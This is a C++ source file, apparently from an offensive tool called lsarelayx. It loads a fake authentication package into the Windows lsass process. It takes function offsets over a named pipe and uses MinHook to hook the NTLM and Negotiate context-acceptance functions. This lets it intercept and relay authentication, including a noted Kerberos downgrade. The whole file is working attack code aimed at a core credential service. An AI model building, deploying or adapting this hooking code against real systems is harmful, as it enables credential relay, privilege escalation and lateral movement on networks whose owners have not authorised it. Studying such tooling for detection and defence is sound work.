#include "lsarelayx.hxx"

#include <string>
#include <vector>
#include <system_error>
#include <new>
#include <sddl.h>

#include "commands.h"
#include "handle.hxx"
#include "msv1_0.hxx"
#include "spnego.hxx"
#include "debug.hxx"
#include "include/MinHook.h"

/*
 *  This file in the main entry point for our lsarelayx authentication package.
 *  It's not a real authentication package, but just enough so that NTLM and Negotiate
 *  packages can be hooked inside lsass
 *
 *  On startup in communicates over the pipe to get function details
 *  for msv1_0.dll and the spnego functions inside LSASS itself.
 *  Once these are communicated, the functions are hooked and handled
 *  by msv1_0.cpp and spnego.cpp respectively
 *
 */


#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

MessageExchangeFactoryPtr g_messageExchangeFactory;

PLSA_SECPKG_FUNCTION_TABLE g_FunctionTable = nullptr;
SpAcceptLsaModeContextFn* msv1_0_SpAcceptLsaModeContext_orig = nullptr;
SpDeleteContextFn* msv1_0_SpDeleteSecurityContext_orig = nullptr;
SpAcceptLsaModeContextFn* Nego_SpAcceptLsaModeContext_orig = nullptr;
SpDeleteContextFn* Nego_SpDeleteSecurityContext_orig = nullptr;

RelayContextMap g_RelayContexts;
SpmpLookupPackagefn SpmpLookupPackage = nullptr;

SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable;

CRITICAL_SECTION g_ContextLock = {0,0,0,0,0,0};


NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo){
    PackageInfo->Name = (SEC_WCHAR *)L"lsarelayx";
    PackageInfo->Comment = (SEC_WCHAR *)L"lsarelayx";
    PackageInfo->fCapabilities = 0;
    PackageInfo->wRPCID = SECPKG_ID_NONE;
    PackageInfo->cbMaxToken = 0;
    PackageInfo->wVersion = 1;
    return 0;
}

int GetTokenBufferInfo(PSecBufferDesc secBufferDesc, int32_t& index){

    if(secBufferDesc != nullptr){
        for(unsigned long idx = 0; idx < secBufferDesc->cBuffers; ++idx){
            if(secBufferDesc->pBuffers[idx].BufferType == SECBUFFER_TOKEN && secBufferDesc->pBuffers[idx].pvBuffer != nullptr){
                index = idx;
                return secBufferDesc->pBuffers[idx].cbBuffer;
            }
        }
    }

    index = -1;
    return -1;
}

MessageBuffer GetTokenMessageBuffer(PSecBufferDesc secBufferDesc, int32_t& index){

    GetTokenBufferInfo(secBufferDesc, index);

    if(index != -1){
        DBGPRINT(L"Found SECBUFFER_TOKEN @ %d", index);
        return MessageBuffer((uint8_t*)secBufferDesc->pBuffers[index].pvBuffer, (uint8_t*)(DWORD_PTR(secBufferDesc->pBuffers[index].pvBuffer) + secBufferDesc->pBuffers[index].cbBuffer));
    }

    return MessageBuffer();
}

DWORD NTAPI InitThread(LPVOID){


    HANDLE hMsvMod = GetModuleHandle(TEXT("msv1_0.dll"));

    if(hMsvMod == nullptr){
        return GetLastError();
    }

    if (MH_Initialize() != MH_OK) {
          OutputDebugString(TEXT("Failed to initalize MinHook library\n"));
          return -1;
    }

    try{

        InitializeCriticalSection(&g_ContextLock);

        if(!g_messageExchangeFactory)
            g_messageExchangeFactory = CreatePipeFactory("\\\\.\\pipe\\lsarelayx");

        RelayContext initContext(g_messageExchangeFactory, true, 0);

        int status = MH_OK;
        InitCommandResponse initResponse = Deserialize<InitCommandResponse>(initContext.SendCommand(InitCommand()));
        PVOID currentFuncAccept = PVOID((DWORD_PTR(hMsvMod) + initResponse.AcceptLsaContextOffset));
        PVOID currentFuncDeleteCtx = PVOID((DWORD_PTR(hMsvMod) + initResponse.DeleteLsaContextOffset));

        status |= MH_CreateHook(currentFuncAccept, (PVOID)msv1_0_SpAcceptLsaModeContextHook, (PVOID*)&msv1_0_SpAcceptLsaModeContext_orig);
        status |= MH_CreateHook(currentFuncDeleteCtx, (PVOID)msv1_0_SpDeleteSecurityContextHook, (PVOID*)&msv1_0_SpDeleteSecurityContext_orig);

        HANDLE hLsaSrv = GetModuleHandle(TEXT("lsasrv.dll"));
        if(hLsaSrv != nullptr && initResponse.SpmpLookupPackageOffset != 0){
            SpmpLookupPackage = (SpmpLookupPackagefn)((ULONG_PTR)hLsaSrv + initResponse.SpmpLookupPackageOffset);
        }

        if(SpmpLookupPackage != nullptr){
            UNICODE_STRING negPackage;
            RtlInitUnicodeString(&negPackage, L"Negotiate");
            PLSAP_SECURITY_PACKAGE package = SpmpLookupPackage(&negPackage);

            if(package != nullptr){
                DBGPRINT(L"Found Negotiate LSA package at 0x%llx with AcceptLsaModeContext 0x%llx", package, package->FunctionTable.AcceptLsaModeContext);
                status |= MH_CreateHook((LPVOID)package->FunctionTable.AcceptLsaModeContext, (LPVOID)Nego_SpAcceptLsaModeContextHook,(PVOID*)&Nego_SpAcceptLsaModeContext_orig);
            }else{
                DBGPRINT(L"Negotiate LSA package not found", 0);
            }

        }else{
            DBGPRINT(L"SpmpLookupPackage function not available, Kerberos downgrade not possible", 0);
        }


        if(status == MH_OK){
            MH_EnableHook(MH_ALL_HOOKS);
            DBGPRINT(L"Initialised lsarelayx",0);
            return 1;
        }else{
            DBGPRINT(L"Failed to initalize lsarelayx with error %d", status);
        }

    }catch(std::exception e){
        DBGPRINT(L"Failed to initalize lsarelayx: %S", e.what());
    }

    return 0;
}

NTSTATUS NTAPI SpInitialize(ULONG_PTR , PSECPKG_PARAMETERS, PLSA_SECPKG_FUNCTION_TABLE FunctionTable){

    g_FunctionTable = FunctionTable;
    DWORD initThreadId = 0;

    HANDLE hThread = CreateThread(nullptr, 0, InitThread, nullptr, 0, &initThreadId);

    WaitForSingleObject(hThread, 1000);

    if(hThread != nullptr){
        CloseHandle(hThread);
    }

    return 0;
}

NTSTATUS NTAPI SpShutDown(void) {
    return 0;
}

NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE, PUNICODE_STRING, PSECPKG_PRIMARY_CRED, PSECPKG_SUPPLEMENTAL_CRED){
    return 0;
}

extern "C" NTSTATUS SpLsaModeInitialize(ULONG, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables){

    memset(&SecurityPackageFunctionTable, 0, sizeof(SecurityPackageFunctionTable));
    SecurityPackageFunctionTable.Initialize = SpInitialize;
    SecurityPackageFunctionTable.Shutdown = SpShutDown;
    SecurityPackageFunctionTable.GetInfo = SpGetInfo;
    SecurityPackageFunctionTable.AcceptCredentials = SpAcceptCredentials;

    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables = (PSECPKG_FUNCTION_TABLE)&SecurityPackageFunctionTable;
    *pcTables = 1;

    return 0;
}




